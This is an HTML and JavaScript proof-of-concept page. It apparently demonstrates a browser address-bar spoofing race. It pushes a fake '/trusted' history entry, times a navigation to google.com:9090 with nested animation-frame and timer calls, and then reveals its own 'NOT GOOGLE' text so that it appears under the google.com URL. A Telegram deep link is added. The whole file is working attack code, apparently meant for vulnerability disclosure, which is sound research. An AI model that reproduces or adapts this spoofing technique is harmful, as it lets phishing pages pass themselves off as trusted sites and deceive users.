<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>PoC</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
body {
  margin: 0;
  font-family: -apple-system, BlinkMacSystemFont, system-ui;
  background: #f5f5f7;
}

button {
  font-size: 15px;
  padding: 10px 14px;
  border-radius: 10px;
  border: none;
  background: #007aff;
  color: #fff;
}

#panel {
  display: none;
  max-width: 420px;
  margin: 80px auto;
  background: #fff;
  padding: 32px;
  border-radius: 16px;
  box-shadow: 0 20px 60px rgba(0,0,0,.2);
  text-align: center;
}

#spoof {
  display: none;          /* ⬅️ DISEMBUNYIKAN DULU */
  font-size: 28px;
  font-weight: 600;
  color: #b00020;
  margin-top: 16px;
}

.notice {
  margin-top: 14px;
  font-size: 13px;
  color: #666;
}
</style>
</head>

<body>

<div style="text-align:center; margin-top:60px;">
  <button id="trigger">Start PoC</button>
</div>

<div id="panel">
  <button onclick="openTelegram()">Open Telegram</button>
  <div id="spoof">NOT GOOGLE</div>
  <div class="notice">Shown after URL becomes google.com</div>
</div>

<script>
function logEvent() {}

const panel  = document.getElementById('panel');
const trigger = document.getElementById('trigger');
const spoof  = document.getElementById('spoof');

/* Open Telegram */
function openTelegram() {
  setTimeout(() => {
    location.href = 'tg://resolve?domain=telegram';
  }, 300);
}

/* Step 1 */
trigger.onclick = () => {
  logEvent("poc_started");
  history.pushState({}, '', '/trusted');
  panel.style.display = 'block';
};

/* Step 2: navigation race */
window.addEventListener('pageshow', () => {
  logEvent("pageshow");

  requestAnimationFrame(() => {
    requestAnimationFrame(() => {
      setTimeout(() => {
        location.href = 'https://google.com:9090';

        /* ⬇️ TAMPILKAN TEKS SETELAH NAVIGATION */
        setTimeout(() => {
          spoof.style.display = 'block';
        }, 50);

      }, 80);
    });
  });
});
</script>

</body>
</html>
